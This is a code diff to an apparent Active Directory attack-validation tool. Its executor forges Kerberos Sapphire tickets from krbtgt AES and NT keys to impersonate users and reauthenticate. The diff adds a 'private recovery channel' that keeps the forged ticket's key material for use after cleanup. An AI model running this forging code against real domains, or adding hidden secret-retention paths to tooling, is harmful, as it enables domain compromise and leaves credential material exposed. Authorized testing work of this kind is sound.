@@ -20,7 +20,8 @@ from pathlib import Path
 
 from ..recommend import ParamSpec, values
 from .. import proof, states
-from .base import (ValidationExecutor, ExecutorContext, Capability,
+from ._reveal_common import key_material
+from .base import (SecretReveal, ValidationExecutor, ExecutorContext, Capability,
                    CAP_PRINCIPAL, CAP_AES_KEY, CAP_NT_HASH)
 from .forge_common import (signing_key, valid_key, resolve_domain_sid,
                            requester_argv, forge_and_reauth)
@@ -84,7 +85,18 @@ class SapphireTicketExecutor(ValidationExecutor):
         return cap.channel in (CAP_AES_KEY, CAP_NT_HASH) and valid_key(
             cap.value, "aes" if cap.channel == CAP_AES_KEY else "nt")
 
+    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
+        return list(artifact.get("_reveal", []))
+
     def execute(self, ctx: ExecutorContext, finding, params) -> dict:
+        # Private recovery channel, populated before downstream proof/cleanup.
+        artifact = {"_reveal": []}
+        ctx._pending_reveal_artifact = artifact
+
+        def finish_artifact(*args):
+            artifact.update(self._artifact(*args))
+            return artifact
+
         cfg = ctx.config
         v = values(params)
         out_dir = Path(ctx.output_dir)
@@ -95,19 +107,19 @@ class SapphireTicketExecutor(ValidationExecutor):
         sid = resolve_domain_sid(ctx, v.get("domain_sid") or None)
         if not sid:
             errors.append("domain_sid_unresolved")
-            return self._artifact(steps, gate, None, False, errors)
+            return finish_artifact(steps, gate, None, False, errors)
         aes, kind = signing_key(ctx)
         if not (kind == "aes" and valid_key(aes, "aes")):
             errors.append("no_aes_signing_key")        # Sapphire needs the krbtgt AES key
-            return self._artifact(steps, gate, None, False, errors)
+            return finish_artifact(steps, gate, None, False, errors)
         nt = getattr(cfg, "forge_key_nt", None)
         if not (nt and valid_key(nt, "nt")):
             errors.append("no_nt_signing_key")          # H6: Sapphire needs BOTH krbtgt keys
-            return self._artifact(steps, gate, None, False, errors)
+            return finish_artifact(steps, gate, None, False, errors)
         req = requester_argv(cfg)
         if req is None:
             errors.append("no_requester_credential")
-            return self._artifact(steps, gate, None, False, errors)
+            return finish_artifact(steps, gate, None, False, errors)
 
         imp = v["impersonate"]
         forged = v["forged_user"]
@@ -115,7 +127,9 @@ class SapphireTicketExecutor(ValidationExecutor):
                        "-aesKey", aes, "-nthash", nt, "-domain-sid", sid,
                        "-domain", cfg.domain, forged])
         ok, fsteps, ferrors = forge_and_reauth(ctx, forge_argv, forged, v["reauth_target"], out_dir,
-                                               expect_principal=imp)
+                                               expect_principal=imp,
+                                               on_ticket=lambda path: artifact["_reveal"].extend(
+                                                   key_material(self.technique, "ccache", imp, path)))
         steps += fsteps
         errors += ferrors
 
@@ -127,7 +141,7 @@ class SapphireTicketExecutor(ValidationExecutor):
                                           "authn_success" if ok else "authn_failed"),
             extra={"impersonate": imp, "forged_user": forged},
         )
-        return self._artifact(steps, gate, terminal_fact, ok, errors)
+        return finish_artifact(steps, gate, terminal_fact, ok, errors)
 
     def produced(self, ctx, finding, params, artifact):
         if not artifact.get("complete"):
